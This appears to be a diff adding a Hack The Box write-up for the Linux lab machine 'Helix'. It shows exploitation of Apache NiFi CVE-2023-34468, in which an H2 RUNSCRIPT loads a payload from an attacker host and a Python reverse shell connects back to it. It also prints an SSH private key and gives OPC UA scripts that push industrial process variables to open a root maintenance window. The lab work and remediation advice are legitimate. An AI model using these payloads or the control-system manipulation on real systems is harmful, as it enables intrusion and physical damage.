@@ -5,7 +5,6 @@
   <meta charset="utf-8" />
   <meta content="width=device-width, initial-scale=1.0" name="viewport" />
   <title>HTB Writeup - Helix</title>
-  <link href="../../assets/Icone.png" rel="icon" type="image/png" />
   <script>
     (function () {
       const THEME_STORAGE_KEY = 'portfolio-theme';
@@ -38,7 +37,7 @@
 </head>
 
 <body class="challenge-body">
-  <header class="challenge-hero">
+    <header class="challenge-hero" style="position: relative;">
     <div style="position: absolute; top: 1.5rem; right: 2rem; z-index: 10;">
       <button aria-label="Switch to light mode" class="theme-toggle" data-theme-toggle="" type="button">
         <span class="theme-track">
@@ -55,7 +54,7 @@
       <div class="challenge-meta">
 
         <div class="challenge-icon-container">
-          <img alt="Facts Machine Icon" class="challenge-icon" src="./assets/machine_image.png" />
+          <img alt="Helix Machine Icon" class="challenge-icon" src="./assets/machine_image.png" />
         </div>
         <div>
           <span class="meta-label">Difficulty</span>
@@ -63,15 +62,15 @@
         </div>
         <div>
           <span class="meta-label">OS</span>
-          <span class="meta-value" , src="color:green">Linux</span>
+          <span class="meta-value" src="color:green">Linux</span>
         </div>
         <div>
           <span class="meta-label">Platform</span>
-          <span class="meta-value" , src="color:green">Hack The Box</span>
+          <span class="meta-value" src="color:green">HackTheBox</span>
         </div>
         <div>
           <span class="meta-label">IP Address</span>
-          <span class="meta-value" , src="color:green">10.129.16.47</span>
+          <span class="meta-value" src="color:green">10.129.31.58</span>
         </div>
       </div>
       <a class="btn ghost" href="../index.html">← All Writeups</a>
@@ -81,22 +80,558 @@
   <main class="challenge-main">
     <section aria-labelledby="overview-title" class="card section-overview">
       <header class="section-heading">
-        <p class="eyebrow">Disclaimer </p>
-        <h2 id="overview-title">Disclaimer</h2>
+        <p class="eyebrow">Summary </p>
+        <h2 id="overview-title">Machine Overview</h2>
       </header>
       <p>
-        <strong>Due to Hack The Box rules, we cannot share write-ups or solutions for active machines. Write-ups will be
-          published once the machines are retired.</strong>
+        Helix is a medium-difficulty Linux machine on HackTheBox that focuses on web exploitation, internal service enumeration, industrial control systems, and privilege escalation through misconfigured maintenance mechanisms.
       </p>
+    </section>
+
+    <section aria-labelledby="description-title" class="card section-description">
+      <header class="section-heading">
+        <p class="eyebrow">Pentesting Process</p>
+        <h2 id="description-title">Service Enumeration</h2>
+      </header>
+      <p>
+        The assessment began with a comprehensive service enumeration using <strong>Nmap</strong> to identify
+        exposed services and their versions.
+      </p>
+      <p class="center-code">
+        <code class="language-bash">nmap -sC -sV 10.129.31.58</code>
+      </p>
+      <p>
+        The scan reveals two accessible services:
+      </p>
+      <p>
+      <pre class="terminal">
+              <code>
+Nmap scan report for 10.129.31.58
+Host is up (0.31s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://helix.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+            </code></pre>
+      </p>
+      <p>
+        The web server redirects incoming requests to the virtual host <code>helix.htb</code>. To interact with the application correctly, the domain was added to the local <code>/etc/hosts</code> file.
+      </p>
+      <p>
+        <code class="language-bash">echo "10.129.31.58  helix.htb" >> /etc/hosts</code>
+      </p>
+
+      </p>
+      <header class="section-heading">
+        <h2 id="overview-title">VHost Enumeration</h2>
+      </header>
+      <p>Virtual host enumeration was performed to identify additional services hosted under the target domain.</p>
+      <p>
+        <code class="language-bash">ffuf -w /snap/seclists/current/Discovery/DNS/combined_subdomains.txt -u http://helix.htb -H "Host: FUZZ.helix.htb" -fs 154</code>
+      <pre class="terminal">
+              <code>
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://helix.htb
+ :: Wordlist         : FUZZ: /snap/seclists/current/Discovery/DNS/combined_subdomains.txt
+ :: Header           : Host: FUZZ.helix.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response size: 154
+________________________________________________
+
+flow                    [Status: 200, Size: 1068, Words: 110, Lines: 28, Duration: 1237ms]    
+
+ </code></pre>
+      </p>
+      <p>The enumeration identified the virtual host <strong>flow.helix.htb</strong>, which hosts an instance of <strong>Apache NiFi</strong>.</p>
+
+      <header class="section-heading">
+        <h2 id="overview-title">Vulnerability Analysis</h2>
+      </header>
+
+      <p>The application hosted on <strong>flow.helix.htb</strong> is running <strong>Apache NiFi 1.21.0</strong>.</p>
+      <img src="assets/apache_nifi.png" width="60%"/>
+
+      <p>This version is vulnerable to a Remote Code Execution vulnerability identified as <strong>CVE-2023-34468</strong>.</p>
+
+      <p>A public PoC exploit for this vulnerability is available on GitHub <a class="ref" href="#references">[1]</a>.</p>
+
+
+      <header class="section-heading">
+        <h3 id="overview-title">Remote Code Execution (CVE-2023-34468)</h3>
+      </header>
+
+      <p>Exploitation of the vulnerability requires the creation of a malicious <strong>DBCPConnectionPool</strong> controller service configured to use the embedded <strong>H2</strong> database driver.</p>
+
+      <p>A new <strong>DBCPConnectionPool</strong> controller service was created with the following configuration:</p>
+
+      <table>
+        <tr>
+          <th>Property</th>
+          <th>Value</th>
+        </tr>
+        <tr>
+          <td>Database Connection URL</td>
+          <td>jdbc:h2:mem:tempdb;TRACE_LEVEL_SYSTEM_OUT=3;</td>
+        </tr>
+        <tr>
+          <td>Database Driver Class Name</td>
+          <td>org.h2.Driver</td>
+        </tr>
+        <tr>
+          <td>Database Driver Location(s)</td>
+          <td>work/nar/extensions/nifi-poi-nar-1.21.0.nar-unpacked/NAR-INF/bundled-dependencies/h2-2.1.214.jar</td>
+        </tr>
+      </table>
+
+      <p><img src="assets/DBCPConnectionPool.png" width="80%"/></p>
+      
+      <p>An <strong>ExecuteSQL</strong> processor was then configured to execute a malicious SQL payload hosted on the attacker's machine.</p>
+
+      <table>
+        <tr>
+          <th>Property</th>
+          <th>Value</th>
+        </tr>
+        <tr>
+          <td>Database Connection Pooling Service</td>
+          <td>DBCPConnectionPool (The one that we created previously)</td>
+        </tr>
+        <tr>
+          <td>SQL select query</td>
+          <td>RUNSCRIPT FROM 'http://&lt;ATTACKER_IP&gt;:&lt;ATTACKER_PORT&gt;/rce.sql'</td>
+        </tr>
+
+      </table>
+
+      <p><img src="assets/ExecuteSQL.png" width="80%"/></p>
+
+      <p>An <strong>Output Port</strong> was connected to the <strong>ExecuteSQL</strong> processor to complete the NiFi flow configuration.</p>
+
+      <img src="assets/Output_Port.png" width="80%"/>
+
+      <p>On the attacker machine, a temporary HTTP server (listening on <strong>ATTACKER_PORT</strong>) was started to host the malicious SQL script <strong>rce.sql</strong>.</p>
+
+      <p>The SQL payload creates a Java alias capable of executing arbitrary system commands on the target host.</p>
+
+      <p>      <pre class="terminal">
+              <code>
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+String[] command = {"bash", "-c", cmd};
+java.util.Scanner s = new
+java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
+return s.hasNext() ? s.next() : ""; }
+$$;
+CALL SHELLEXEC('echo &lt;BASE64_ENCODED_REVERSE_SHELL_PAYLOAD&gt; | base64 -d | /bin/bash');
+      </code></pre>
+      </p>
+
+      <p>The following Python3 payload was used to establish a reverse shell connection to the target machine:</p>
+
+<p><code class="language-bash">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;ATTACKER_IP&gt;",&lt;REV_SHELL_LISTENNING_PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'    </code></p>
+
+      <p>After starting the malicious NiFi flow, a reverse shell was successfully received as the user <strong>nifi</strong>.</p>
+
+      <img src="assets/rev_shell.png" width="80%"/>
+
+    <header class="section-heading">
+        <h2 id="overview-title">Post-Exploitation Enumeration</h2>
+    </header>
+    <p>After obtaining remote code execution on the target machine, internal enumeration was performed to identify additional attack vectors, sensitive files, and privilege escalation opportunities.</p>
+
+    <header class="section-heading">
+      <h3 id="overview-title">SSH Key Discovery</h3>
+    </header>
+
+    <p>Enumeration of the filesystem revealed the existence of a second user named <strong>operator</strong>.</p>
+
+    <p>After executing <strong>LinPEAS</strong>, a backup of the operator user's SSH private key was discovered within the NiFi support bundle directory: </p>
+
+    <p class="center-code">
+        <code class="language-bash">cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak</code>
+      <pre class="terminal">
+              <code>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
+WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw
+AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8
+tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
+-----END OPENSSH PRIVATE KEY-----
+            </code></pre>
+      </p>
+
+      <p> The retrieved SSH private key was used to authenticate to the <strong>operator</strong> account via SSH.</p>
+      
+    <header class="section-heading">
+        <h2 id="overview-title">Internal Enumeration</h2>
+    </header>
+
+    <p>Additional enumeration was performed from the context of the <strong>operator</strong> account to identify privileged services and internal infrastructure components.</p>
+
+    <header class="section-heading">
+      <h3 id="overview-title">Industrial Control System Discovery</h3>
+    </header>
+
+    <p>During the enumeration of the operator user's home directory, an image and a password-protected PDF document related to industrial infrastructure were discovered.</p>
+
+    <p>The image contains a diagram that exposes the presence of an industrial control system communicating over the <strong>OPC UA</strong> protocol on port <strong>4840</strong>.</p>
+
+    <img src="assets/control systems diagram.png" alt="Control Systems Diagram" width="80%"/>
+
+    <p>The service endpoint identified in the documentation was: <code>opc.tcp://127.0.0.1:4840/helix/</code></p>
+
+    <p>Using the <code>netstat</code> command, it was confirmed that the OPC UA service was actively listening on the local machine.</p>
+
+    <p>The PDF password hash was extracted and cracked using <strong>John The Ripper</strong>, revealing the password <strong>operator1</strong>.</p>
+
+    <header class="section-heading">
+      <h3 id="overview-title">Operator Sudo Privileges</h3>
+    </header>
+
+    <p>The <strong>operator</strong> user was allowed to execute a custom maintenance script with root privileges.</p>
+
+    <p class="center-code">
+        <code class="language-bash">sudo -l</code>
+      <pre class="terminal">
+              <code>
+Matching Defaults entries for operator on helix:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User operator may run the following commands on helix:
+    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
+            </code></pre>
+      </p>
+
+      <p>The maintenance script validates whether a maintenance window is currently active before spawning an interactive privileged shell.</p>
+
+          <p class="center-code">
+        <code class="language-bash">cat /usr/local/sbin/helix-maint-console</code></p>
+
+      <p><code class="language-bash">#!/bin/bash
+set -euo pipefail
+
+FLAG="/opt/helix/state/maintenance_window"
+
+read_until() { cat "$FLAG" 2>/dev/null || true; }
+
+window_ok() {
+  [ -f "$FLAG" ] || return 1
+  local until_ts now
+  until_ts="$(read_until)"
+  now="$(date +%s)"
+  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
+  [ "$now" -lt "$until_ts" ] || return 1
+  return 0
+}
+
+if ! window_ok; then
+  echo "Maintenance window CLOSED."
+  exit 1
+fi
+
+until_ts="$(read_until)"
+now="$(date +%s)"
+remaining=$((until_ts-now))
+
+echo "[+] Privileged maintenance access granted"
+echo "[!] Window expires in ${remaining} seconds"
+echo "[!] Session will be terminated automatically"
+
+# Unique scope name
+SCOPE="helix-maint-$$"
+
+# Launch an interactive root shell attached to THIS TTY, in its own systemd scope
+systemd-run --quiet --scope --unit="$SCOPE" --property=KillMode=control-group --property=SendSIGHUP=yes \
+  /bin/bash -p -i
+
+# If systemd-run returns, the shell exited.
+exit 0</code>
+        </p>
+
+      <header class="section-heading">
+        <h2 id="overview-title">Privilege Escalation</h2>
+      </header>
+
+      <p>Privilege escalation was achieved by interacting with the industrial control system in order to enable the maintenance window required by the privileged maintenance script.</p>
+
+      <header class="section-heading">
+        <h3 id="overview-title">Port Forwarding</h3>
+      </header>
+
+      <p>To facilitate interaction with the internal OPC UA service from the attacker machine, SSH local port forwarding was configured using the operator account.</p>
+
+<p class="center-code">
+<code class="language-bash">ssh -i operator_id_ed25519.bak operator@helix.htb -L 4840:127.0.0.1:4840</code></p>
+
+      <header class="section-heading">
+        <h3 id="overview-title">Maintenance Window Mechanism</h3>
+      </header>
+
+    <p>Analysis of the privileged maintenance script revealed that root access would only be granted if both <strong>Maintenance Mode</strong> and the <strong>Maintenance Window</strong> were active.</p>
+
+    <p>According to the documentation recovered from the operator user's home directory, activating maintenance mode required modifying several industrial process variables exposed through the OPC UA service.</p>
+
+    <img src="assets/Maintenance_Mode.png" width="80%"/>
+
+    <p><strong>Maintenance window</strong> is opened when the following conditions are met: </p>
+    <img src="assets/Maintenance_Window.png" width="80%"/>
+
+    <header class="section-heading">
+        <h3 id="overview-title">OPC UA Enumeration</h3>
+    </header>
+
+    <p>The Python <strong>OPCUA</strong> library was used to interact with the industrial control server and enumerate available nodes.</p>
+
+    <header class="section-heading">
+      <h4 id="overview-title">Maintenance Nodes Discovery</h4>
+    </header>
+
+    <p>The following script was used to recursively enumerate accessible OPC UA nodes and their associated properties:</p>
+    <p><code class="language-python">from opcua import Client
+
+client = Client("opc.tcp://127.0.0.1:4840")
+
+client.connect()
+
+def browse(node, level=0, max_depth=4):
+    try:
+        browse_name = node.get_browse_name()
+        nodeid = node.nodeid
+        node_class = node.get_node_class()
+
+        print(
+            "  " * level
+            + f"{browse_name.Name} | {nodeid} | {node_class}"
+        )
+
+        if level >= max_depth:
+            return
+
+        children = node.get_children()
+
+        for child in children:
+            browse(child, level + 1, max_depth)
+
+    except Exception as e:
+        print("Error:", e)
+
+root = client.get_root_node()
+
+browse(root)
+
+client.disconnect()</code></p>
+
+    <p>The following nodes were identified as relevant to the maintenance workflow:</p>
+
+    <table>
+        <tr>
+          <th>Node Name</th>
+          <th>Node ID</th>
+          <th>Node Class</th>
+        </tr>
+        <tr>
+          <td>Mode</td>
+          <td>FourByteNodeId(ns=2;i=12)</td>
+          <td>2</td>
+        </tr>
+        <tr>
+          <td>TestOverride</td>
+          <td>FourByteNodeId(ns=2;i=13)</td>
+          <td>2</td>
+        </tr>
+        <tr>
+          <td>CalibrationOffset</td>
+          <td>FourByteNodeId(ns=2;i=6)</td>
+          <td>2</td>
+        </tr>
+        <tr>
+          <td>Temperature</td>
+          <td>FourByteNodeId(ns=2;i=4)</td>
+          <td>2</td>
+        </tr>
+        <tr>
+          <td>Pressure</td>
+          <td>FourByteNodeId(ns=2;i=5)</td>
+          <td>2</td>
+        </tr>
+    </table>
+
+    <header class="section-heading">
+        <h4 id="overview-title">Mode Switching</h4>
+    </header>
+    <p>The system mode was changed to <strong>MAINTENANCE</strong> by modifying the value of the <strong>Mode</strong> node.</p>
+    <p><code class="language-python">mode_node = client.get_node("ns=2;i=12")
+mode_node.set_value("MAINTENANCE")
+</code></p>
+    <header class="section-heading">
+        <h4 id="overview-title">Enabling Override</h4>
+    </header>
+    <p>To enable the override functionality, the value of the <strong>TestOverride</strong> node was set to <strong>True</strong>.</p>
+    <p><code class="language-python">override_node = client.get_node("ns=2;i=13")
+override_node.set_value(True)
+</code></p>
+    <header class="section-heading">
+        <h4 id="overview-title">Temperature Manipulation</h4>
+    </header>
+    <p>To activate the maintenance window, the system temperature needed to reach approximately <strong>295°C</strong>.</p>
+    
+    <p>The temperature could not be modified directly through the <strong>Temperature</strong> node. However, it could be influenced indirectly through the <strong>CalibrationOffset</strong> node. </p>
+    
+    <img src="assets/Temperature_CalibrationOffset.png" width="80%"/>
+    
+    <p>Multiple calibration values were tested to observe their impact on the system temperature.</p>
+<p><code class="language-python"># CalibrationOffset Node and Temperature Node
+calibration_node = client.get_node("ns=2;i=6")
+temp_node = client.get_node("ns=2;i=4")
+
+# List of calibration values to test
+calibrations = [0.0, 2.5, 5.0, 7.5, 10.0, 12.5, 15.0, 17.5, 20.0, 22.5, 25.0, 27.5, 30.0, 32.5, 35.0, 37.5, 40.0, 42.5, 45.0]
+# List to store the corresponding temperature values
+temperatures = []
+    
+for value in calibrations:
+  # Set the calibration value
+  calibration_node.set_value(value)
+
+  # Read the corresponding temperature value
+  temperature = temp_node.get_value()
+
+  # Store the temperature value
+  temperatures.append(temperature)
+   
+# Print the calibration values and their corresponding temperature values
+print("Calibration values:", calibrations)
+print("Temperature values:", temperatures)</code></p>
+
+    <p>The following graph illustrates the relationship between the calibration offset values and the corresponding temperature readings:</p>
+    
+    <img src="assets/calb_temp.png" width="100%"/>
+
+    <p>Based on the graph, the temperature reaches approximately <strong>295°C</strong> when the calibration offset is around <strong>12.15</strong>.</p>
+
+    <header class="section-heading">
+        <h4 id="overview-title">Maintenance Window Activation</h4>
+    </header>
+
+    <p>
+      The previous steps were combined into a single script to activate the maintenance window. To ensure that the temperature reached <strong>295°C</strong>, the calibration offset was gradually increased up to <strong>20</strong>.
+    </p>
+
+    <p>
+      A one-second delay was introduced between each modification to avoid destabilizing the system.
+    </p>
+
+    <p><code class="language-python">from opcua import Client
+import time
+
+client = Client("opc.tcp://127.0.0.1:4840")
+
+try:
+    client.connect()
+
+    # Nodes
+    mode_node = client.get_node("ns=2;i=12")
+    override_node = client.get_node("ns=2;i=13")
+    calibration_node = client.get_node("ns=2;i=6")
+    temp_node = client.get_node("ns=2;i=4")
+
+    #1. Set maintenance mode
+    mode_node.set_value("MAINTENANCE")
+    print("Mode set to:", mode_node.get_value())
+
+    # 2. Enable override
+    override_node.set_value(True)
+    print("TestOverride set to:", override_node.get_value())
+    
+    
+    # 3. Increase calibration offset gradually
+    calibrations = [0.0, 2.5, 5.0, 7.5, 10.0, 12.5, 15.0, 17.5, 20.0]
+    
+    for value in calibrations:
+        calibration_node.set_value(value)
+        
+        print(f"CalibrationOffset set to: {value}")
+        
+        temperature = temp_node.get_value()
+        print(f"Current Temperature: {temperature}")
+        
+        # Check maintenance window condition
+        if temperature >= 295:
+            print("[+] Maintenance window reached")
+            break
+        
+        # Wait between steps
+        time.sleep(1)
+
+finally:
+    client.disconnect()</code></p>
+    <p>After executing the script, the desired temperature was successfully reached, enabling the maintenance window.</p>
+
+    <img src="assets/Increase_temerature.png" width="80%"/>
+
+    <p>
+      Once the maintenance window was activated, the privileged maintenance script was executed using <code>sudo</code>, resulting in a root shell on the target machine.
+    </p>
+
+    <img src="assets/root_access.png" width="80%"/>
     </section>
 
     <section aria-labelledby="overview-title" class="card section-overview">
       <header class="section-heading">
-        <p class="eyebrow">Proof of Completion</p>
-        <h2 id="overview-title">Proof of Completion</h2>
+        <p class="eyebrow">Mitigation</p>
+        <h2 id="overview-title">Remediation</h2>
       </header>
+      <p>
+        The following remediation steps can help prevent exploitation of the identified vulnerabilities:
+      </p>
+      <ul>
+        <li>Upgrade <strong>Apache NiFi</strong> to version <strong>1.22.0 or later</strong></li>
+        <li>Restrict access to the Apache NiFi administrative interface</li>
+        <li>Prevent sensitive files such as SSH private keys from being stored in accessible backup directories</li>
+        <li>Implement authentication and authorization controls on industrial control interfaces</li>
+      </ul>
+    </section>
+
+    <section aria-labelledby="overview-title" class="card section-overview" id="references">
+      <header class="section-heading">
+        <p class="eyebrow">References</p>
+        <h2 id="overview-title">References</h2>
+      </header>
+
+      <ol type="1" style="list-style-type: none; counter-reset: ref-counter;">
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">1</span>]</span>
+          <a href="https://github.com/mbadanoiu/CVE-2023-34468/blob/main/Apache%20NiFi%20-%20CVE-2023-34468.pdf"
+            target="_blank" rel="noopener noreferrer">
+            GitHub | Apache NiFi - CVE-2023-34468.pdf</a>
+        </li>
+
+      </ol>
+    </section>
+
+    <section aria-labelledby="overview-title" class="card section-overview" id="references">
       <img src="./assets/machine_solved.png" width="100%"/>
     </section>
+
+
 
   </main>
 
@@ -105,6 +640,7 @@
   </footer>
 
   <script>
+    
     const currentYearEl = document.getElementById('current-year');
     if (currentYearEl) {
       currentYearEl.textContent = new Date().getFullYear();
